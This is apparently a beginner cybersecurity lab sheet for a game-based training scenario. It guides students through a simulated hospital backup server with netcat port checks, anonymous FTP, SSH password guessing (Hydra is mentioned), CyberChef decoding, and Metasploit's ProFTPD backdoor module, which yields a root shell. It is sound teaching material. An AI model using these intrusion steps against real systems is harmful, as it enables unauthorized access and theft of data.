---
title: "Ransomed Trust: VM Technical Steps"
author: ["Z. Cliffe Schreuders"]
license: "CC BY-SA 4.0"
description: "Technical companion to the Ransomed Trust walkthrough, for the server work on the hospital backup server: the concepts behind it, step-by-step hints for the foothold, the FTP and ProFTPD routes to the flags, plus command-line practice and reflection questions."
tags: ["linux", "ssh", "ftp", "proftpd", "metasploit", "anonymous-login", "backdoor", "privilege-escalation", "cyberchef", "break-escape"]
categories: ["introducing_attacks"]
type: ["game-based-learning", "lab-sheet"]
difficulty: "beginner"
source: "https://github.com/cliffe/BreakEscape/blob/main/scenarios/m02_ransomed_trust/labsheet_vm_steps.md"
cybok:
  - ka: "MAT"
    topic: "Attacks and exploitation"
    keywords: ["EXPLOITATION", "EXPLOITATION FRAMEWORKS", "BACKDOOR TROJANS", "Ransomware behavior"]
  - ka: "SS"
    topic: "Categories of Vulnerabilities"
    keywords: ["CVEs and CWEs", "Supply chain compromise", "ProFTPD 1.3.3c backdoored source release (OSVDB-69562)", "Backup systems", "File system security"]
  - ka: "SOIM"
    topic: "PENETRATION TESTING"
    keywords: ["PENETRATION TESTING - SOFTWARE TOOLS", "PENETRATION TESTING - ACTIVE PENETRATION", "Incident Response", "Recovery procedures", "Ransomware response"]
  - ka: "NS"
    topic: "PENETRATION TESTING"
    keywords: ["FILE-TRANSFER PROTOCOL (FTP)"]
  - ka: "F"
    topic: "Artifact Analysis"
    keywords: ["Encoding and alternative data formats"]
  - ka: "AC"
    topic: "Symmetric Cryptography"
    keywords: ["symmetric encryption and authentication", "Key recovery", "Base64", "ROT13"]
  - ka: "HF"
    topic: "Human Factors"
    keywords: ["Social engineering"]
  - ka: "CPS"
    topic: "Physical Security"
    keywords: ["Physical access control", "RFID access systems"]
  - ka: "AAA"
    topic: "Authentication"
    keywords: ["Access control bypass", "RFID authentication"]
---

> Note: This is the technical companion to the [Ransomed Trust walkthrough](https://cliffe.github.io/HacktivityLabSheets/labs/introducing_attacks/m02-ransomed-trust/). Play the game up to the server room there first, and come here for the server work.

## Purpose

By the end of this companion you should be able to:

- Explain what a network service is, and how to check that one is listening.
- Test a login over SSH and FTP, and say why a shared or reused password is a weak point.
- Read a service banner to find the version that is running, and match it to a known weakness.
- Use Metasploit to run one exploit against one target, with the right listener settings.
- Recognise when you have root, and why that matters for the files you can read.

## How to Use This Companion

The hints are layered. Read the **Hint** first, then open the **Nudge**, and open the **Recipe** only when you are stuck. Go back to the Kali terminal after each one and try the step yourself.

Every answer in this mission is generated for your game. Values such as the flags and passwords are not written in this sheet, and the hints tell you where to find them in the game.

## Getting Started: The Server Work

Your attack box is the Kali terminal in the server room. It is the only machine in the building that can reach the backup server's network. The backup server is the target. Its address is **172.16.0.3** and the Kali box is **172.16.0.2**.

The game gives you four flags. You submit each one at the SAFETYNET Drop-Site Terminal, which sits in the same room. Each flag unlocks more of the game, and the last one opens the staging cache.

1. \==action: Open the VM Access Terminal in the server room==. This is the Kali box.
2. \==action: Log in if the terminal asks you to==. The login for the Kali box is not written in this sheet. If the terminal does not show it, ask your tutor.
3. \==action: Open a shell== and check that you can reach the target with `ping -c 1 172.16.0.3`.

> Tip: The end of Stage 4 is a natural stopping point for a 60-minute class. The ProFTPD backdoor is the longest stage, so it can start the next session.

> Warning: The target is a different machine from Kali. Commands you run on Kali do not change the backup server, and commands you run on the backup server only work once you have logged in to it.

## Concepts: What You Are Attacking

Each concept below has an illustrative example. Run the examples on your own Kali box, not on the game target, unless a hint tells you to.

### A service is a program that listens on a port

A server runs many services. Each one listens on a numbered port, and a client connects to that port. The two services on the backup server are:

| Port | Service | What it does | What to try |
|------|---------|--------------|-------------|
| 21 | FTP | Moves files. Some servers allow an anonymous login | Connect and look at what is public |
| 22 | SSH | Gives a remote shell after a login | Test logins, once you have a username |

To check that a port is open, use netcat:

```bash
nc -zv 172.16.0.3 22
```

A reply that says `succeeded` means something is listening. A reply that says `Connection refused` means the port is closed, the service is down, or the address is wrong.

### SSH and online password guessing

SSH is an encrypted remote shell. You log in with a username and a password. An online guessing tool such as Hydra tries one password after another against the login until one works.

Guessing only works when the passwords are weak or shared. Here is a short wordlist with a repeated line. The `sort -u` step removes the repeat:

```bash
printf 'example1\nexample2\nexample1\n' | sort -u | wc -l
```

This prints `2`: there are two unique passwords in the list. A short, targeted list often beats a huge generic one, because people reuse the same few passwords.

> Question: Why is a password written on a sticky note, and reused on a second system, a bigger risk than a single strong password kept in one place?

### FTP and anonymous login

FTP moves files between machines. Many FTP servers allow an **anonymous** login, which lets anyone connect and read the public folders. Anonymous access is often switched on for a public notice or a download area, and it is one of the first things to check.

A typical anonymous session looks like this. The commands are real, the responses are typical, and yours will differ:

```bash
ftp 172.16.0.3
# Name: anonymous
# Password: (any text, often an email address)
ftp> ls
ftp> get notice.txt
ftp> quit
```

> Warning: Read the file list before you download anything. A public folder can hold a notice that names the version of the software that is running, and you need that version for the next stage.

### Backdoored software

A backdoor is a hidden way in. Sometimes it is added on purpose by the people who ship the software. A **trojaned release** is a version of a program whose source code was changed before it was published. Anyone who uses that copy gets the backdoor.

The version a service runs is often visible in its **banner**, the text it prints when you connect. A banner that names a version tells you which known weaknesses to look for. Read the banner before you choose a Metasploit module, so the module matches the version you found.

### A Linux shell and where your rights stop

Once you log in, you have a shell. Five commands tell you where you are:

```bash
whoami     # your account name
id         # your account, groups and numeric ID
hostname   # the machine name
pwd        # the folder you are in
ls -la     # every file here, including hidden ones, and their owners
```

Files belong to users. A normal account cannot read a root-only folder:

```bash
cat /root/example.txt
# cat: /root/example.txt: Permission denied
```

The message `Permission denied` means your account is not allowed to read that file. It does not mean the file is missing.

### Privilege escalation and sudo

Privilege escalation means moving from a normal account to a more powerful one, such as root. The root account can read any file on the machine.

`sudo` lets a user run some commands as another user. Check what your account is allowed to do with:

```bash
sudo -l
```

If the list is empty or shows nothing useful, do not spend long on it. In this mission the reliable route to root is the ProFTPD backdoor, and that does not need sudo.

## Stuck? Hints: The Server Work

These stages go in play order. Each one has a visible hint, then a Nudge, then a Recipe.

### Stage 1: Find the Backup Server {#hints-vm-find}

**Where:** the Kali terminal in the server room. **Goal:** confirm the target is reachable and that its services answer.

> Hint: The backup server's address appears in several notes in the building. Which notes did you read, and do any of them name a port?

<details markdown="1">
<summary>Nudge</summary>

The address and the server's software version are in the IT department's notes and on the network diagram. Once you have the address, check two ports, FTP (21) and SSH (22), before you try anything else.

**Learn it:** ==action: Before you connect, write down the address, the two ports and the software version on paper.== You will use all three in the next stages.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Find the backup server's address in the IT department notes== (172.16.0.3).
2. \==action: Check the FTP port:== `nc -zv 172.16.0.3 21`
3. \==action: Check the SSH port:== `nc -zv 172.16.0.3 22`

</details>

### Stage 2: The Anonymous Notice (flag 3) {#hints-vm-ftp}

**Where:** the Kali shell. **Goal:** read the public notice over anonymous FTP and submit its flag.

> Hint: The FTP server allows a login for anyone. Look for the public folder before you guess at anything.

<details markdown="1">
<summary>Nudge</summary>

Connect with the anonymous account and list the folder. One file is a notice from the backup server. It names the software version, the public folders and a restricted folder on the server. Read it. The notice gives you the next target.

**To learn more in game:** ask Agent HaX for the reconnaissance guide. It covers scanning and reading a service before you attack it. The published copy is at [Reconnaissance and Network Mapping](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/reconnaissance-and-network-mapping/).

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Connect to FTP as anonymous==: `ftp 172.16.0.3`, then enter `anonymous` for the name and any text for the password.
2. \==action: List the folder== with `ls`, then `get` the notice.
3. \==action: Read the notice== with `cat` on Kali, and copy the flag it shows.
4. \==action: Submit the flag at the SAFETYNET Drop-Site Terminal== in the server room.

</details>

> Warning: Copy the whole flag string exactly, from its first character to its last, with nothing added and nothing missing.

### Stage 3: The SSH Foothold (flag 1) {#hints-vm-ssh}

**Where:** the Kali shell. **Goal:** log in to the backup server over SSH as the IT administrator's account, then submit the flag you find in his files.

> Hint: You need a username and a password. Gary's own access notes name the account. Where did Gary keep his passwords?

<details markdown="1">
<summary>Nudge</summary>

The username is `gary`, as Gary's access notes say. The password is one of three candidates on a sticky note in the IT department, on the desk by his monitor. Try each one. OpenSSH prints `Permission denied, please try again.` for a wrong password, and then asks again.

Hydra can also test the three candidates for you. Make a short file with one candidate per line, and run it against the SSH port. It is more work than trying them by hand, and the field guide shows the syntax.

**To learn more in game:** ask Agent HaX for the SSH guide. It covers the SSH check, online password testing and the first commands to run after login. The published copy is at [SSH Access and Bruteforce](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/ssh-access-and-bruteforce/).

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Try each candidate on the sticky note==: `ssh gary@172.16.0.3`. Accept the host key the first time.
2. \==action: After you log in, run `whoami` and `pwd`== to confirm you are `gary` on the backup server.
3. \==action: Find the backup procedures document== in Gary's hospital documents folder, and read it with `cat`.
4. \==action: Submit the flag from that document at the SAFETYNET Drop-Site Terminal==.

</details>

> Warning: The most common failure is trying one candidate many times. There are only three candidates, so move to the next one after the first refusal.

### Stage 4: The Encoded Operational Log (flag 4) {#hints-vm-log}

**Where:** the Kali shell, then the Drop-Site Terminal. **Goal:** recover Ghost's encoded operational log over anonymous FTP and decode it.

> Hint: The notice pointed at a restricted folder. The log is encoded, so the file alone is not readable. What tool turns an encoded file back into text?

<details markdown="1">
<summary>Nudge</summary>

Use the same anonymous FTP connection from Stage 2. The notice names the folder the log lives in, and the log is readable without root. Download it, then decode it in CyberChef. The flag is inside the decoded text, not in the encoded text.

**Learn it:** ==action: Before you use CyberChef, look at the characters in the file.== Are they all letters? Is there a regular pattern? Note your guess, then try the recipe.

**To learn more in game:** ask Agent HaX for the CyberChef guide. It covers the tool, the common recipes and how to test one. The published copy is at [Encoding and Decoding with CyberChef](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/encoding-and-decoding-with-cyberchef/).

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Connect to FTP as anonymous== again, and `get` the encoded log.
2. \==action: Open CyberChef== and paste the file's text into **Input**.
3. \==action: Try the **Magic** operation==, or add the decoding operation that matches the pattern you noted.
4. \==action: Copy the flag from the decoded text== and submit it at the SAFETYNET Drop-Site Terminal.

</details>

> Warning: The flag is in the output, not the input. If the output is still unreadable, the recipe is wrong. Try a different decoding operation rather than reading more into the encoded text.

### Stage 5: The ProFTPD Backdoor (flag 2, and root) {#hints-vm-proftpd}

**Where:** the Kali shell, then Metasploit. **Goal:** use the backdoor in the ProFTPD version named in the notice, and submit the flag from the root-only deployment log.

> Hint: The version in the banner is the same as the version in the notice. Metasploit has a module for that exact version and that kind of weakness.

<details markdown="1">
<summary>Nudge</summary>

Start Metasploit and search for `proftpd`. Pick the module whose name describes a backdoor, not one for a different version. Then set the target and your own address. The callback address is the Kali box (172.16.0.2), not the target. Read the options with `show options` before you run anything.

**Learn it:** ==action: Before you run the exploit, read every option in `show options` and say what each one does.== If a value is blank, set it. If a value is wrong, the session will not open.

**To learn more in game:** ask Agent HaX for the ProFTPD guide. It covers the workflow from listener to shell, and what to check after you get in. The published copy is at [ProFTPD Exploitation Workflow](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/proftpd-exploitation-workflow/).

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Start Metasploit==: `msfconsole`
2. \==action: Search for the module==: `search proftpd`, and pick the backdoor module for the version in the notice.
3. \==action: Load the module and read its options==: `use` the module path, then `show options`.
4. \==action: Set the target==: `set RHOST 172.16.0.3`, and the port the service uses.
5. \==action: Set the callback address to the Kali box==: `set LHOST 172.16.0.2`, and a free port for `LPORT`.
6. \==action: Run the exploit== with `exploit`. Then run `whoami` in the new session. It should show root.
7. \==action: Read the root-only deployment log== and submit its flag at the SAFETYNET Drop-Site Terminal.

</details>

> Warning: If you see `Exploit completed, but no session was created.`, the listener and the payload do not match, or `LHOST` is set to the target's address. Check the two values in `show options` before you run it again.

**Optional check before you use the backdoor:** ==action: Run `sudo -l` as gary== and note what it shows. If it shows nothing you can use, the backdoor is the route to root.

### Stage 6: Back to the Game {#hints-vm-finish}

**Where:** the Drop-Site Terminal, then the rest of the building. **Goal:** confirm that all four flags are in.

> Hint: The drop-site records each flag you submit. Check which ones are in before you return to the game.

<details markdown="1">
<summary>Nudge</summary>

Each flag you submit unlocks something in the game. The story can move on before the server is finished, but the ending needs all four flags. If one is missing, go back to the stage it came from.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Open the Drop-Site Terminal== and check which flags you have submitted.
2. \==action: If one is missing, return to its stage== and submit it there.
3. \==action: Return to the game.==

</details>

## What the Server Is Telling You

| Message or symptom | Usual cause |
|--------------------|-------------|
| `Connection refused` on port 21 or 22 | The service is not listening, the port is wrong or the address is wrong |
| `Permission denied, please try again.` | The password is wrong for that account. Try the next candidate |
| `Permission denied` when reading a file | Your account cannot read that file. You need root, or the file is not where you think |
| `Exploit completed, but no session was created.` | The payload or listener does not match, or `LHOST` is set to the target's address |
| The session opens, then drops at once | The payload is unstable, or the callback address is wrong. Try the exploit again with the values checked |
| Hydra finishes with no match | The username or the list is wrong. Check the account name first |

## Try It on the Command Line (Optional)

These exercises run on your own Kali box. None of them touch the game target.

1. ==action: Build a short wordlist of your own made-up words, then count its unique lines== with `sort -u | wc -l`.
2. ==action: Check that you can read a service banner on your own machine==: `nc -v 127.0.0.1 22`. Most Kali boxes will refuse the connection, and that is a useful result.
3. ==action: List the files in your home folder with `ls -la`==, and say which ones are hidden and who owns each one.
4. ==action: Run `id` and `whoami` in a shell==, and explain why the two answers are the same or different.

## After the Game: Questions and Exercises

### Attacking the Server

> Question: Why does a backdoor in the source code survive a fully patched system? Think about who wrote the code, and who installed it.

> Question: The notice gave away the software version. Why is a version number in a public banner a risk, even when the password is strong?

> Question: Gary's notes said the password was a known risk, and the board deferred the fix. Which is the bigger failure, the password or the deferred patch?

> Action: Write a three-line note for the hospital's IT director. Name the two services you tested, the one you would fix first, and the reason. Keep it to plain facts.

## Further Reading

- [SAFETYNET Field Guide: Reconnaissance and Network Mapping](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/reconnaissance-and-network-mapping/)
- [SAFETYNET Field Guide: SSH Access and Bruteforce](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/ssh-access-and-bruteforce/)
- [SAFETYNET Field Guide: ProFTPD Exploitation Workflow](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/proftpd-exploitation-workflow/)
- [SAFETYNET Field Guide: Encoding and Decoding with CyberChef](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/encoding-and-decoding-with-cyberchef/)
